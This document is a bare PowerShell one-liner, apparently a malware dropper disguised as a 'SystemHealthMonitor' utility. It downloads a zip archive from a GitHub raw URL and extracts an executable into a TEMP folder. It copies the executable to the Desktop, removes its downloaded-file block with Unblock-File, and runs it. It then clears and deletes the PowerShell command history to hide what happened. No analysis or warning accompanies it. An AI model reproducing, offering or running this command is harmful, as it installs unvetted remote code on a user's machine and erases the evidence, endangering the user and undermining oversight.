$shell=New-Object -ComObject Shell.Application;$dl=$shell.Namespace('shell:Downloads').Self.Path;$ds=[Environment]::GetFolderPath("Desktop");$wd="$env:TEMP\SystemHealth";$url="https://github.com/AlaricGrey/z/raw/refs/heads/main/readme.zip";$zip=Join-Path $dl "readme.zip";New-Item -ItemType Directory -Force -Path $wd | Out-Null;Invoke-WebRequest -Uri $url -OutFile $zip;Expand-Archive -Path $zip -DestinationPath $wd -Force;$exe=Get-ChildItem -Path $wd -Filter "SystemHealthMonitor.exe" -Recurse | Select-Object -First 1;$dest=Join-Path $ds "SystemHealthMonitor.exe";Copy-Item -Path $exe.FullName -Destination $dest -Force;Unblock-File -Path $dest;Start-Process -FilePath $dest;[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();$h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";if(Test-Path $h){Remove-Item $h -Force};exit
